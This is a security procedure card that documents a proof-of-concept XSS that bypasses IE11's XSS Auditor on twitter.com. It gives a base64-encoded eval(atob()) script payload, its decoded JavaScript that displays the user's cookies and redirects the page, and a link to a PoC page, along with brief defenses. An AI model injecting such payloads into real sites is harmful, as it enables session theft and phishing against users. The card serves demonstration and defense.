---
id: proc-xss-auditor-bypass
tags:
  - xss
  - bypass
  - cookie-theft
type: procedure
tools:
  - '[[tools/Internet-Explorer-11]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/twitter-xss-bypass-poc-url]]'
  - '[[commands/base64-xss-payload]]'
  - '[[commands/decoded-xss-js]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:20.789Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Demonstrate-XSS-Auditor-Bypass-POC

## Summary

This procedure uses a base64-encoded JavaScript payload in a script tag to bypass IE's XSS Auditor, executing code that alerts domain/cookies and redirects, achieving full XSS for theft/phishing.

## Description

Encoding the JS in base64 and using eval(atob()) evades auditor patterns. Injected via padded redirect into 404 page. Expected: JS runs in twitter.com context, exfiltrating data.

## Requirements

1. IE11
2. Prior injection setup
3. Base64 encoding tool

## Defense

Defensive measures and detection strategies:

- Advanced auditor/WAF for encoded payloads
- Base64 decoding in input validation
- Alert on JS redirects from error pages

## Objectives

1. Bypass built-in protections
2. Steal session data
3. Demonstrate impact (theft/CSRF)

## Instructions

### Step 1: Prepare Encoded Payload

**Context**: Encode JS to alert domain, cookies, and redirect.

**Command** ([[commands/base64-xss-payload]]):
```html
<script>eval(atob('YWxlcnQoJ1hTUyBQT0MnKTthbGVydCgnRG9tYWluOiAnK2RvY3VtZW50LmRvbWFpbik7YWxlcnQoJ1lvdXIgQ29va2llczpcbicrZG9jdW1lbnQuY29va2llKTt0b3AubG9jYXRpb24uaHJlZj0naHR0cDovL2V4YW1wbGUuY29tJzs='))</script>
```

> Use in redirect URL path. Expected output: Obfuscated injection.

### Step 2: Load Bypass POC

**Context**: Access HTML file simulating the injection.

**Command** ([[commands/twitter-xss-bypass-poc-url]]):
```url
https://secgeek.net/POC/Twitter-XSS-POC.html
```

> In IE. Expected output: Alerts fire, cookies shown, redirect.

### Step 3: Decode and Verify JS

**Context**: Understand the payload.

**Command** ([[commands/decoded-xss-js]]):
```javascript
alert('XSS POC');alert('Domain: '+document.domain);alert('Your Cookies:\n'+document.cookie);top.location.href='http://example.com';
```

> Expected output: Series of alerts and redirect.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/twitter-xss-bypass-poc-url]]
- [[commands/base64-xss-payload]]
- [[commands/decoded-xss-js]]

## Tools Used

- [[tools/Internet-Explorer-11]]

## Tags

- xss
- bypass
- cookie-theft
